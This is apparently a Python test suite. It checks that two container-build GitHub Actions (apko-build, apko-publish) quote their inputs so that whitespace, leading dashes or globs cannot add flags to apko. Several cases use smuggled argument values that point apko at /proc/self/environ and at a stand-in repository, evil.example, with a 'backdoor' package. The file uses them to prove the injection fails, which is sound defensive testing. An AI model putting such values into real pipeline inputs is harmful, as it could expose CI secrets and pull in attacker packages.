"""Tests for the argument lists apko-build and apko-publish pass to apko.

Each case runs the container script from an action.yaml under busybox sh, with
a stand-in apko that records its argv, and checks:

- which flags apko receives (everything before "--"), and
- which positional arguments it receives (everything after "--").

Usage: python3 -I test_container_args.py <repo-root> [unittest args]
"""

import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest

import yaml

REPO = os.environ.get("ACTIONS_REPO") or os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

STUB_APKO = r"""#!/bin/sh
# Record argv as one JSON-ish line per invocation: NUL-separated, then a newline.
for a in "$@"; do printf '%s\0' "$a"; done >> "$ARGV_LOG"
printf '\n' >> "$ARGV_LOG"
[ "$1" = publish ] && echo "registry.example/img@sha256:0000"
exit 0
"""


def container_script(action, debug=False):
    """Return the shell script an action passes to `docker run ... -c`."""
    with open(os.path.join(REPO, action, "action.yaml")) as f:
        doc = yaml.safe_load(f)
    for step in doc["runs"]["steps"]:
        run = step.get("run") or ""
        m = re.search(r'<<"EOF"\n(.*?)\nEOF', run, re.DOTALL)
        if m:
            script = m.group(1)
            break
    else:
        raise AssertionError(f"no docker -c heredoc in {action}")
    # Match both the original `inputs.debug && '--log-level debug'` form and
    # the hardened `inputs.debug == 'true' && '--log-level debug' || ''` form,
    # so this harness doesn't break when the expression is tightened.
    script = re.sub(
        r"\$\{\{\s*inputs\.debug(?:\s*==\s*'true')?\s*&& '--log-level debug'\s*(?:\|\|\s*'')?\s*\}\}",
        "--log-level debug" if debug else "",
        script,
    )
    assert "${{" not in script, f"unexpected expression left in {action} script"
    return script.replace("/usr/bin/apko", "apko")


def run_script(action, inputs, debug=False):
    """Run the container script with INPUTS_* set; return apko invocations."""
    tmp = tempfile.mkdtemp(prefix="argtest-")
    try:
        bindir = os.path.join(tmp, "bin")
        os.mkdir(bindir)
        stub = os.path.join(bindir, "apko")
        with open(stub, "w") as f:
            f.write(STUB_APKO)
        os.chmod(stub, 0o755)
        # A file a stray glob would match, to show globbing is off.
        open(os.path.join(tmp, "GLOB_WOULD_MATCH_THIS"), "w").close()
        log = os.path.join(tmp, "argv.log")
        env = {
            "PATH": bindir + ":/usr/bin:/bin",
            "ARGV_LOG": log,
            "HOME": tmp,
        }
        env.update({f"INPUTS_{k.upper().replace('-', '_')}": v for k, v in inputs.items()})
        # apko-publish tees to /tmp/digest; point it into the temp dir instead.
        script = container_script(action, debug).replace('"/tmp/digest"', f'"{tmp}/digest"')
        proc = subprocess.run(
            ["busybox", "sh", "-c", script],
            env=env, cwd=tmp, capture_output=True, text=True, check=False,
        )
        if proc.returncode != 0:
            raise AssertionError(
                f"{action} script exited {proc.returncode}\n"
                f"inputs={inputs}\nstdout={proc.stdout}\nstderr={proc.stderr}"
            )
        calls = []
        if os.path.exists(log):
            with open(log, "rb") as f:
                for line in f.read().split(b"\n"):
                    if line:
                        calls.append([a.decode() for a in line.split(b"\0")[:-1]])
        return calls
    finally:
        shutil.rmtree(tmp)


def split_at_dashdash(argv):
    """Split an apko argv into (subcommand, flags, positionals) at the first "--"."""
    sub, rest = argv[0], argv[1:]
    if "--" not in rest:
        return sub, rest, None
    i = rest.index("--")
    return sub, rest[:i], rest[i + 1:]


# Inputs that every case starts from; cases override what they test.
BUILD_BASE = {
    "config": ".apko.yaml",
    "tag": "ghcr.io/example/img:latest",
    "vcs-url": "false",
    "lockfile": "",
}
PUBLISH_BASE = dict(BUILD_BASE, **{"image-refs": "/tmp/apko.images", "sbom-path": ""})

def fixed_flags(action, inputs):
    """The flags every apko call gets, in order, before the optional ones."""
    flags = [f"--vcs={inputs['vcs-url']}", f"--lockfile={inputs['lockfile']}"]
    if action == "apko-publish":
        flags += [f"--image-refs={inputs['image-refs']}", f"--sbom-path={inputs['sbom-path']}"]
    return flags

INJECT = "-k /proc/self/environ -r https://evil.example/os -p backdoor"

# name, action, inputs (over the base), want flags (after the fixed ones), want positionals
CASES = [
    # --- normal inputs keep working ---
    ("build: defaults only", "apko-build", {},
     [], [".apko.yaml", "ghcr.io/example/img:latest", "output.tar"]),
    ("build: every list input set", "apko-build",
     {"keyring-append": "a.pub,b.pub", "build-repository-append": "https://b.example",
      "repository-append": "https://r.example", "package-append": "foo,bar",
      "archs": "x86_64,aarch64", "build-options": "opt1,opt2"},
     ["-k", "a.pub,b.pub", "-b", "https://b.example", "-r", "https://r.example",
      "-p", "foo,bar", "--arch", "x86_64,aarch64",
      "--build-option", "opt1", "--build-option", "opt2"],
     [".apko.yaml", "ghcr.io/example/img:latest", "output.tar"]),
    ("build: build-options with spaces after commas split as before", "apko-build",
     {"build-options": "opt1, opt2"},
     ["--build-option", "opt1", "--build-option", "opt2"],
     [".apko.yaml", "ghcr.io/example/img:latest", "output.tar"]),
    ("publish: defaults only", "apko-publish", {},
     [], [".apko.yaml", "ghcr.io/example/img:latest"]),
    ("publish: space-separated tags become separate tag arguments", "apko-publish",
     {"tag": "ghcr.io/example/img:latest ghcr.io/example/img:1.2.3"},
     [], [".apko.yaml", "ghcr.io/example/img:latest", "ghcr.io/example/img:1.2.3"]),
    ("publish: annotations and sbom-path pass through", "apko-publish",
     {"annotations": "org.example/key:value", "sbom-path": "."},
     ["--annotations", "org.example/key:value"],
     [".apko.yaml", "ghcr.io/example/img:latest"]),

    # --- whitespace in a value can't add flags ---
    ("build: whitespace in tag stays inside the tag argument", "apko-build",
     {"tag": "foo:latest " + INJECT},
     [], [".apko.yaml", "foo:latest " + INJECT, "output.tar"]),
    ("build: whitespace in config stays inside the config argument", "apko-build",
     {"config": "c.yaml " + INJECT},
     [], ["c.yaml " + INJECT, "ghcr.io/example/img:latest", "output.tar"]),
    ("build: whitespace in keyring-append stays one -k value", "apko-build",
     {"keyring-append": "a.pub " + INJECT},
     ["-k", "a.pub " + INJECT],
     [".apko.yaml", "ghcr.io/example/img:latest", "output.tar"]),
    ("publish: whitespace in tag only adds tag arguments, after --", "apko-publish",
     {"tag": "ghcr.io/example/img:latest " + INJECT},
     [], [".apko.yaml", "ghcr.io/example/img:latest"] + INJECT.split()),
    ("publish: whitespace in annotations stays one --annotations value", "apko-publish",
     {"annotations": "k:v " + INJECT},
     ["--annotations", "k:v " + INJECT],
     [".apko.yaml", "ghcr.io/example/img:latest"]),

    # --- a value starting with "-" can't be read as a flag ---
    ("build: tag starting with - is a positional argument", "apko-build",
     {"tag": "--keyring-append=/proc/self/environ"},
     [], [".apko.yaml", "--keyring-append=/proc/self/environ", "output.tar"]),
    ("build: config starting with - is a positional argument", "apko-build",
     {"config": "-k/proc/self/environ"},
     [], ["-k/proc/self/environ", "ghcr.io/example/img:latest", "output.tar"]),
    ("publish: tag starting with - is a positional argument", "apko-publish",
     {"tag": "--keyring-append=/proc/self/environ"},
     [], [".apko.yaml", "--keyring-append=/proc/self/environ"]),

    # --- globs aren't expanded ---
    ("build: * in archs stays literal", "apko-build", {"archs": "*"},
     ["--arch", "*"], [".apko.yaml", "ghcr.io/example/img:latest", "output.tar"]),
    ("publish: * in tag stays literal", "apko-publish", {"tag": "*"},
     [], [".apko.yaml", "*"]),
]


class ContainerArgs(unittest.TestCase):
    def test_cases(self):
        for name, action, overrides, want_flags, want_pos in CASES:
            with self.subTest(name):
                base = BUILD_BASE if action == "apko-build" else PUBLISH_BASE
                inputs = dict(base, **overrides)
                fixed = fixed_flags(action, inputs)
                calls = run_script(action, inputs)
                main = [c for c in calls if c and c[0] in ("build", "publish")]
                self.assertEqual(len(main), 1, f"want one apko build/publish call, got calls={calls}")
                _, flags, pos = split_at_dashdash(main[0])
                self.assertIsNotNone(pos, f"no '--' in argv={main[0]}")
                self.assertEqual(
                    flags, fixed + want_flags,
                    f"flags mismatch\ninputs={json.dumps(inputs)}\nargv={main[0]}")
                self.assertEqual(
                    pos, want_pos,
                    f"positionals mismatch\ninputs={json.dumps(inputs)}\nargv={main[0]}")

    def test_debug_flag(self):
        for name, action in [("build: debug adds --log-level", "apko-build"),
                             ("publish: debug adds --log-level", "apko-publish")]:
            with self.subTest(name):
                base = BUILD_BASE if action == "apko-build" else PUBLISH_BASE
                calls = run_script(action, base, debug=True)
                _, flags, _ = split_at_dashdash(calls[-1])
                self.assertIn("--log-level", flags, f"argv={calls[-1]}")
                self.assertEqual(flags[flags.index("--log-level") + 1], "debug", f"argv={calls[-1]}")
        # The default (debug unset / false) must NOT enable debug logging; this
        # is the bug the == 'true' fix closed.
        for name, action in [("build: default omits --log-level", "apko-build"),
                             ("publish: default omits --log-level", "apko-publish")]:
            with self.subTest(name):
                base = BUILD_BASE if action == "apko-build" else PUBLISH_BASE
                calls = run_script(action, base, debug=False)
                _, flags, _ = split_at_dashdash(calls[-1])
                self.assertNotIn("--log-level", flags, f"argv={calls[-1]}")

    def test_publish_login(self):
        cases = [
            ("login: registry is the tag's first path component",
             "ghcr.io/example/img:latest", ["login", "-u", "user", "--password-stdin", "--", "ghcr.io"]),
            ("login: tag starting with - is still the positional registry",
             "--insecure/x:1", ["login", "-u", "user", "--password-stdin", "--", "--insecure"]),
        ]
        for name, tag, want in cases:
            with self.subTest(name):
                inputs = dict(PUBLISH_BASE, **{"tag": tag, "generic-user": "user", "generic-pass": "pw"})
                calls = run_script("apko-publish", inputs)
                self.assertEqual(calls[0], want, f"inputs={inputs}\ncalls={calls}")


if __name__ == "__main__":
    # Optional: ACTIONS_REPO env var or first arg overrides the repo root.
    if len(sys.argv) > 1 and not sys.argv[1].startswith("-"):
        REPO = os.path.abspath(sys.argv.pop(1))
    unittest.main(verbosity=2)
